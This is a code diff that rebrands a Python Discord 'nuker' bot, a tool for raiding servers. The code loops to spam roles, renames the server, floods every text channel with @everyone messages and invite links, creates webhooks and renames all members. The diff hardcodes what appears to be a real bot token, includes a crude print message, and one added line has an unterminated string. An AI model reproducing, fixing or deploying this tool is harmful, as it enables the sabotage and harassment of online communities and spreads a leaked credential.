@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix=">",intents=intents)
 bot.remove_command("help")
 with open('config.json') as f:
     data = json.load(f)
-    token = data["TOKEN"]
+    token = data["MTEzODY5MTE4NDQxNjU0Mjc4MA.GzLrfD.Z216vudr0tGfeRWwAU_2FXoNZkP336iFIzUI-I"]
 @bot.event
 async def on_ready():
     print(f'''
@@ -63,16 +63,16 @@ async def admin(ctx):
 @bot.command()
 async def rspam(ctx):
  while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU")
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU")
    print("Spamming roles <3")
 @bot.command()
 async def transrspam(ctx):
  while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="Caught! NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
    print("Spamming roles <3")
 @bot.command()
 async def rdelete(ctx):
@@ -151,7 +151,7 @@ async def help(ctx):
 
 @bot.command()
 async def pingspam(ctx):
-    await ctx.guild.edit(name="SERVER WIZZED")
+    await ctx.guild.edit(name="$TT/Caught!)
     print("raped channels <3")
     latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
     lattersL = latters.split()
@@ -166,15 +166,15 @@ async def pingspam(ctx):
       for channel in ctx.guild.text_channels:
         try:
           webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
+          await channel.send(f"Beamed! @everyone https://discord.gg/Jf72x52jms $TT RUNS YOU         {r1}")
+          await ctx.channel.create_webhook(name="wizzed by $TT")
+          await channel.send(f"Beamed! @everyone https://discord.gg/Jf72x52jms $TT RUNS YOU   {r1}")
           await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
+          await channel.send(f"Beamed! @everyone https://discord.gg/Jf72x52jms $TT RUNS YOU                {r1}")
+          await ctx.channel.create_webhook(name="wizzed by $TT")
+          await channel.send(f"Beamed! @everyone https://discord.gg/Jf72x52jms $TT RUNS YOU     {r1}")
           await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU              {r1}")
+          await channel.send(f"Beamed! @everyone https://discord.gg/Jf72x52jms $TT RUNS YOU              {r1}")
           await webhook.send()
         except:
           pass 
@@ -197,7 +197,7 @@ async def servername(ctx, name = None):
     time.sleep(8)
     await em1001.delete()
 @bot.command()
-async def nickall(ctx, *, name="! TOOL RUNS YOU"):
+async def nickall(ctx, *, name="! $TT RUNS ME"):
   print("Nicking All")
   for member in ctx.guild.members:
     try:
